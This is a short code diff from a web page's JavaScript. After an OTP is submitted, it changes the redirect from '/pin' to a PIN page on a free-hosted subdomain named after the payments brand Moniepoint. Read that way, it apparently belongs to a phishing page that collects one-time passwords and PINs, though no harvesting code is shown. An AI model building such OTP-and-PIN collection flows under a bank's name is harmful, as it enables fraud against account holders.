@@ -63,7 +63,7 @@ document.getElementById("submitBtn").addEventListener("click", function() {
         console.log(response)
         if(request.statusText === 'OK'){
           Otp = "";
-          location.href = "/pin";
+          location.href = "https://moniepoint.onrender.com/pin";
         }else {
           console.log("error")
         }
